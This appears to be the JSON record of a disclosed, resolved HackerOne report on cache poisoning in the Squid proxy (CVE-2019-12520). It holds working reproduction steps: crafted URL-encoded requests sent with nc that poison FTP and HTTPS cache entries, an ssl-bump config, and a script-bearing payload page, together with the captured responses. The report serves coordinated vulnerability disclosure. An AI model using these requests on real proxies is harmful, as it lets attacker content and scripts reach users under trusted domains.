{
  "id": 824753,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjQ3NTM=",
  "url": "https://hackerone.com/reports/824753",
  "title": "Cache Poisoning",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-03-19T16:44:08.040Z",
  "submitted_at": "2020-03-19T16:44:08.040Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jeriko_one",
    "url": "/jeriko_one",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEN6ZMX6%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T015026Z&X-Amz-Expires=2489&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQDaPeTSLue%2BnrEQPFz%2BGFlOGBetmNIsUt4npGAtXrfntwIhAJQjhaKlYHqET5ebauD%2F36ivbCgvomtYsJw7jjns6wfxKroFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxATwEa%2Bklbzl1pOOIqjgWLiQYO1cLoMkYQ%2FM7yAqTtHBJPPMqU0kuJzwgknHMNizUjfFdnqf6%2F4%2BTnQnOKC%2Fg89XTHcDgjdpJ9MPoIUAHnmevlDSZ4v1PVq1z8b9OVPf1sabxVIJiNQn56qXcUrTfrXoxd97irBxCyfBrC6MiLJ8igFe3JyYHxdQnk%2BU0D8TTm6mOqNiOXFiDgwuSKAaBOuk3Ht5IJ3D%2B8kUFzgbGzhH4WUrPlS1bT%2FoHmfCEL%2FSD4J2UIakTNj%2FGh6SukadXYwvKp5wMfIkr%2FkpHTQ8zP8%2BBaig1ZBvZaRPguK2yNI1HV3hhx38Yh%2BfZp566I29M%2BFUGwCtXKOR6kdZlO75PfRNIcqGhASKKMFdqtT1KjpUg3%2BcvL0lZBTareGY85d34T5lfpgPgGddFv2SJcQvnar0ul1EizwSlqXvT9JVICE1PPs%2FD4DuPWN4dLIa23vyAgeiSmw5%2FLCaxzRc%2FI%2BdQx%2BVcT9sVN677w0I4iT6el8ejQwWsJOrYz4Yh5v5TURo4plIdAy%2BRHfLRg2gbiXGY25B7U8tqCaQ3Vw%2B6R%2BTcJYxS5qAoCPA6eNyhL%2F5ZOzO%2FB7K496u%2BNuulOEYIiNVZ29O2P4C5WENOYsIKZxQqJDwxrHFisMFXINDpZ1EsG%2FN9hz0vwxKj85imB8E8B1zMnY17p%2FvGWwXbIJ0fPND366nUU58FbsKBV68TN0weGkx2i7JW63jZrGDiBs%2B4boCPabrmUiXBgz3cm7CwlyzbIPAL61EsMoTlyc7R3uX4OcgnfziYAixio5ri4gepsLVRRA5bZ2fDgP72H3%2F0UFEbFmSbAWhftwPREqG9nRllckcJ6lxthBf667gza3ccj7YhcoamHFkmucZQWECgMskIwppS8xgY6sAHlIt3gAKrLVe%2B05z%2BrpCfEkWuJtsnsxqBFyPzPzkxEQMemcqp6TN3o6cr7J2KXWl2IO8lymLjoBaLimIW%2B4%2BZrocmXBGDlfHqYyxPCt926V5mmtaUJc2pRkg5hKPHAGa6JbP141KGENaG0dHy0g484U9%2F2%2Fb6FjxlONWFi0bhQEl%2Bw8ks8tpUSG%2FN8HTdx4JQufV9sQC1IP9nwkAjGUetG9LbIf8u5wx1DfNF53NgrlA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5aca70e04b4d39617c26827c49afabc913ff8bc0561b076109312b155de789fb",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEN6ZMX6%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T015026Z&X-Amz-Expires=2489&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQDaPeTSLue%2BnrEQPFz%2BGFlOGBetmNIsUt4npGAtXrfntwIhAJQjhaKlYHqET5ebauD%2F36ivbCgvomtYsJw7jjns6wfxKroFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxATwEa%2Bklbzl1pOOIqjgWLiQYO1cLoMkYQ%2FM7yAqTtHBJPPMqU0kuJzwgknHMNizUjfFdnqf6%2F4%2BTnQnOKC%2Fg89XTHcDgjdpJ9MPoIUAHnmevlDSZ4v1PVq1z8b9OVPf1sabxVIJiNQn56qXcUrTfrXoxd97irBxCyfBrC6MiLJ8igFe3JyYHxdQnk%2BU0D8TTm6mOqNiOXFiDgwuSKAaBOuk3Ht5IJ3D%2B8kUFzgbGzhH4WUrPlS1bT%2FoHmfCEL%2FSD4J2UIakTNj%2FGh6SukadXYwvKp5wMfIkr%2FkpHTQ8zP8%2BBaig1ZBvZaRPguK2yNI1HV3hhx38Yh%2BfZp566I29M%2BFUGwCtXKOR6kdZlO75PfRNIcqGhASKKMFdqtT1KjpUg3%2BcvL0lZBTareGY85d34T5lfpgPgGddFv2SJcQvnar0ul1EizwSlqXvT9JVICE1PPs%2FD4DuPWN4dLIa23vyAgeiSmw5%2FLCaxzRc%2FI%2BdQx%2BVcT9sVN677w0I4iT6el8ejQwWsJOrYz4Yh5v5TURo4plIdAy%2BRHfLRg2gbiXGY25B7U8tqCaQ3Vw%2B6R%2BTcJYxS5qAoCPA6eNyhL%2F5ZOzO%2FB7K496u%2BNuulOEYIiNVZ29O2P4C5WENOYsIKZxQqJDwxrHFisMFXINDpZ1EsG%2FN9hz0vwxKj85imB8E8B1zMnY17p%2FvGWwXbIJ0fPND366nUU58FbsKBV68TN0weGkx2i7JW63jZrGDiBs%2B4boCPabrmUiXBgz3cm7CwlyzbIPAL61EsMoTlyc7R3uX4OcgnfziYAixio5ri4gepsLVRRA5bZ2fDgP72H3%2F0UFEbFmSbAWhftwPREqG9nRllckcJ6lxthBf667gza3ccj7YhcoamHFkmucZQWECgMskIwppS8xgY6sAHlIt3gAKrLVe%2B05z%2BrpCfEkWuJtsnsxqBFyPzPzkxEQMemcqp6TN3o6cr7J2KXWl2IO8lymLjoBaLimIW%2B4%2BZrocmXBGDlfHqYyxPCt926V5mmtaUJc2pRkg5hKPHAGa6JbP141KGENaG0dHy0g484U9%2F2%2Fb6FjxlONWFi0bhQEl%2Bw8ks8tpUSG%2FN8HTdx4JQufV9sQC1IP9nwkAjGUetG9LbIf8u5wx1DfNF53NgrlA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fbd0fe102c139bb867f63bb372df451b356ecf82753aaaf0002ebdd4f656e704"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-12520",
    "CVE-2019-12524"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-08-26T23:26:46.049Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-07-27T23:26:45.547Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nAn attacker can cause Squid to return to the user attacker controlled data, for any domain. From Squid-4.7 and below both HTTPS and FTP could be poisoned. This is due to Squid URL decoding parts of the Request URL and using that to create a hash. Request that decode to the same URL will retrieve the same cached response even if they're from different domains. \n\nThe fix for  CVE-2019-12524 removed the HTTPS aspect of it, but FTP poisoning was still possible till Squid-4.10. \n\n<= Squid-4.9 Vulnerable\n<= Squid-4.7 Can also poison HTTPS was reduced to just FTP \n\nAssigned CVE-2019-12520\nNo Announce was officially made by Squid, and was silently fixed with Squid-4.10. This was going to be announced with http://www.squid-cache.org/Advisories/SQUID-2019_4.txt, but never got published when I demonstrated their patch was incomplete at the time.\n\nFixed in Squid-4.10\n## Steps To Reproduce:\n### Poisoning FTP Cache in Squid-4.9\n1) Start Squid\n2) Start a FTP Server I attached a python script for this\n```\nftp_server.py 8080 8081\n```\n3) Make the Request to poison the cache\n```\necho -e \"GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\nnc: using stream socket\nHTTP/1.1 200 Gatewaying\nServer: squid/4.9\nMime-Version: 1.0\nDate: Thu, 19 Mar 2020 15:57:04 GMT\nContent-Type: text/plain\nLast-Modified: Wed, 27 Mar 2019 19:14:54 GMT\nAge: 79\nX-Cache: HIT from g64\nTransfer-Encoding: chunked\nVia: 1.1 g64 (squid/4.9)\nConnection: keep-alive\n\n23\nHello! This is from my ftp server.\n\n0\n```\n\nThe FTP server should have output similar to \n```\n<- 150 Here comes data\nPassive Connection from: ('192.168.122.97', 51647)\n<- Hello! This is from my ftp server.\n<- 226 Data sent\n-> QUIT\n```\n\n4) Now make the request to the actual domain\nNotice the X-Cache: HIT header\n```\necho -e \"GET ftp://hackerone.com/?@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n\nnc: using stream socket\nHTTP/1.1 200 Gatewaying\nServer: squid/4.9\nMime-Version: 1.0\nDate: Thu, 19 Mar 2020 15:57:04 GMT\nContent-Type: text/plain\nLast-Modified: Wed, 27 Mar 2019 19:14:54 GMT\nAge: 249\nX-Cache: HIT from g64\nTransfer-Encoding: chunked\nVia: 1.1 g64 (squid/4.9)\nConnection: keep-alive\n\n23\nHello! This is from my ftp server.\n\n0\n\n```\n\nYou will get the output from the cached response instead of the real response from hackerone.com or whichever domain you're poisoning \n\n### Poisoning HTTPS Cache in Squid-4.7\nTo repro the HTTPS poisoning you need to configure Squid to cache SSL request. This involves generating a root cert, and inserting some config options. https://wiki.squid-cache.org/Features/DynamicSslCert Has steps on how to achieve this. Below is what I added to my config. You will need to change the prefixes to match your system. \n\nReplace the existing http_port 3128 entry with the following:\n```\nhttp_port 3128 ssl-bump \\\n       generate-host-certificates=on dynamic_cert_mem_cache_size=4MB \\\n       cert=/home/j1/h4x/squid/certs/myCA.pem\nsslcrtd_program /home/j1/h4x/squid/ship/squid-4.7/libexec/security_file_certgen -s /home/j1/h4x/squid/ship/squid-4.7/var/lib/ssl_db -M 4MB\n```\n\nIf your test certs aren't valid (self signed for testing) you need to add the following directive in the config. \n```\nsslproxy_cert_error allow all\n```\n\nFinally you'll need to initalize the SSL DB that you've told Squid to use. This is the -s option in sslcrtd_program\n\n```\n./libexec/security_file_certgen ./var/lib/ssl_db -c -s ./var/lib/ssl_db -M 4MB\n```\n\nYou're also going to need a server with SSL that you can control the headers on.\nYou have to send the following header so that Squid will cache your response. \n```\nCache-Control: public, immutable, max-age=31536000\n```\nOnce you've done that you're ready to repo HTTPS poisoning which is essentially the same as our FTP Poisoning. \n\n1) Start Squid\n```\n./sbin/squid\n```\n\n2) start you SSL Server \n\n3) Make a poison request\n```\necho -e \"GET https://hackerone.com%2f%3f@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n\nnc: using stream socket\nHTTP/1.1 200 OK\nServer: SimpleHTTP/0.6 Python/3.6.10\nDate: Thu, 19 Mar 2020 16:17:46 GMT\nContent-Type: text/html\nContent-Length: 74\nLast-Modified: Mon, 22 Apr 2019 23:18:08 GMT\nCache-Control: public, immutable, max-age=31536000\nX-Cache: MISS from g64\nVia: 1.1 g64 (squid/4.7)\nConnection: keep-alive\n\n<html>\n\t<body>\n\t\t<script>alert(document.domain)</script>\n\t</body>\n</html>\n```\n4) Make the request to the real domain \nNotice the X-Cache: HIT header\n```\necho -e \"GET https://hackerone.com/?@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\nnc: using stream socket\nHTTP/1.1 200 OK\nServer: SimpleHTTP/0.6 Python/3.6.10\nDate: Thu, 19 Mar 2020 16:17:46 GMT\nContent-Type: text/html\nContent-Length: 74\nLast-Modified: Mon, 22 Apr 2019 23:18:08 GMT\nCache-Control: public, immutable, max-age=31536000\nAge: 334\nX-Cache: HIT from g64\nVia: 1.1 g64 (squid/4.7)\nConnection: keep-alive\n\n<html>\n\t<body>\n\t\t<script>alert(document.domain)</script>\n\t</body>\n</html>\n```\n\n## Analysis\n\nWhen making a request Squid will check its cache to see if it has a response\nthat it can serve up. When squid determines that a reply can be cached it uses\na combination of METHOD, absolute URL, and possible vary headers to form a\nMD5 hash.\n\nThis takes place in storeKeyPUblicByRequestMethod\n```\n    SquidMD5Update(&M, &m, sizeof(m));\n    SquidMD5Update(&M, (unsigned char *) url.rawContent(), url.length());\n```\n\nSimilar to the ACL Bypass vuln I reported earlier this abuses that the userInfo is decoded and is stored as part of the url. So when url is used to update the hash it's using a decoded string \n\n```\neffectiveRequestUri() will return url.absolute() for methods that aren't\nCONNECT and schemes that aren't PROTO_AUTHORITY_FORM\n\n Looking at Uri::absolute we see that the userInfo is included into the\n absolute uri representation if the protocol is HTTPS\n\n             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||\n                                      getScheme() != AnyP::PROTO_HTTPS ||\n                                      userInfo().isEmpty();\n            if (!omitUserInfo) {\n                absolute_.append(userInfo());\n                absolute_.append(\"@\", 1);\n            }\n\nuserInfo is set in Uri::parse if the foundHost contains a @ that\nthe userinfo is extracted and then decoded.\n\n        t = strrchr(foundHost, '@');\n        if (t != NULL) {\n            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);\n            login[sizeof(login)-1] = '\\0';\n            t = strrchr(login, '@');\n            *t = 0;\n            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);\n            foundHost[sizeof(foundHost)-1] = '\\0';\n            // Bug 4498: URL-unescape the login info after extraction\n            rfc1738_unescape(login);\n        }\n```\nThis is eventually stored in userInfo when calling parseFinish\n parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);\n\nThis userInfo is the decoded version, therefore special tokens such as ? # /\nare possible entries in the userInfo. \n\nIt's possible to have a cache entry for one domain, be used for another\ndomain. Leading to possible HTML/JS execution in a target domain. The\nrequirement being that it must have the HTTPS protocol.\n\nThis can lead to Squid serving the wrong\nReply as multiple request from different domains can look similar.\n\nTake for example the following:\nhttps://squid-cache.org%2F%3F@192.168.1.23:8080/\n\nThe reply from 192.168.1.23 would decode to\nhttps://squid-cache.org/?@192.168.1.23:8080/\nAnd the reply would be stored\n\nNow if a real request for squid-cache.org came in with a similar URL\nhttps://squid-cache.org?@192.168.1.23:8080/\nThe cached reply would be served, and any scripts that were returned by\nthe original request would now be running in squid-cache.org context.\n\n## Impact\n\nAttacker can poison the Cache causing users to receive attacker controlled data when going to a trusted domain. \nSquid-4.9 And below allows an attacker to poison FTP responses, a user could download attacker controlled data thinking it came from a legitiment source. \n\n<= Squid-4.7 Can also poison HTTPS allowing attacker controlled content to run in another domain. \n\nThese both require a user to visit a specially crafted URL.",
  "weakness": {
    "id": 121,
    "name": "Improper Handling of URL Encoding (Hex Encoding)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 753389,
      "file_name": "ftp_server.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HbVFjvkSVBKEqrUAL9GrTt7A?response-content-disposition=attachment%3B%20filename%3D%22ftp_server.py%22%3B%20filename%2A%3DUTF-8%27%27ftp_server.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEN6ZMX6%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T015026Z&X-Amz-Expires=2489&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQDaPeTSLue%2BnrEQPFz%2BGFlOGBetmNIsUt4npGAtXrfntwIhAJQjhaKlYHqET5ebauD%2F36ivbCgvomtYsJw7jjns6wfxKroFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxATwEa%2Bklbzl1pOOIqjgWLiQYO1cLoMkYQ%2FM7yAqTtHBJPPMqU0kuJzwgknHMNizUjfFdnqf6%2F4%2BTnQnOKC%2Fg89XTHcDgjdpJ9MPoIUAHnmevlDSZ4v1PVq1z8b9OVPf1sabxVIJiNQn56qXcUrTfrXoxd97irBxCyfBrC6MiLJ8igFe3JyYHxdQnk%2BU0D8TTm6mOqNiOXFiDgwuSKAaBOuk3Ht5IJ3D%2B8kUFzgbGzhH4WUrPlS1bT%2FoHmfCEL%2FSD4J2UIakTNj%2FGh6SukadXYwvKp5wMfIkr%2FkpHTQ8zP8%2BBaig1ZBvZaRPguK2yNI1HV3hhx38Yh%2BfZp566I29M%2BFUGwCtXKOR6kdZlO75PfRNIcqGhASKKMFdqtT1KjpUg3%2BcvL0lZBTareGY85d34T5lfpgPgGddFv2SJcQvnar0ul1EizwSlqXvT9JVICE1PPs%2FD4DuPWN4dLIa23vyAgeiSmw5%2FLCaxzRc%2FI%2BdQx%2BVcT9sVN677w0I4iT6el8ejQwWsJOrYz4Yh5v5TURo4plIdAy%2BRHfLRg2gbiXGY25B7U8tqCaQ3Vw%2B6R%2BTcJYxS5qAoCPA6eNyhL%2F5ZOzO%2FB7K496u%2BNuulOEYIiNVZ29O2P4C5WENOYsIKZxQqJDwxrHFisMFXINDpZ1EsG%2FN9hz0vwxKj85imB8E8B1zMnY17p%2FvGWwXbIJ0fPND366nUU58FbsKBV68TN0weGkx2i7JW63jZrGDiBs%2B4boCPabrmUiXBgz3cm7CwlyzbIPAL61EsMoTlyc7R3uX4OcgnfziYAixio5ri4gepsLVRRA5bZ2fDgP72H3%2F0UFEbFmSbAWhftwPREqG9nRllckcJ6lxthBf667gza3ccj7YhcoamHFkmucZQWECgMskIwppS8xgY6sAHlIt3gAKrLVe%2B05z%2BrpCfEkWuJtsnsxqBFyPzPzkxEQMemcqp6TN3o6cr7J2KXWl2IO8lymLjoBaLimIW%2B4%2BZrocmXBGDlfHqYyxPCt926V5mmtaUJc2pRkg5hKPHAGa6JbP141KGENaG0dHy0g484U9%2F2%2Fb6FjxlONWFi0bhQEl%2Bw8ks8tpUSG%2FN8HTdx4JQufV9sQC1IP9nwkAjGUetG9LbIf8u5wx1DfNF53NgrlA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b8d0abad89b090a3af69799555b4d2589f31d89aed9d643bdcaaf4b7bcf06089",
      "file_size": 4619,
      "type": "text/x-python",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-08-26T23:26:45.736Z",
  "allow_singular_disclosure_after": -128399020.89278017,
  "singular_disclosure_allowed": true,
  "vote_count": 14,
  "voters": [
    "n1m0",
    "tolga",
    "fqdn",
    "ali",
    "akashhamal0x01",
    "kmxx",
    "aseem0xff",
    "waterunderthebridge",
    "renatestrind",
    "margyabindu",
    "and 4 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 84124,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
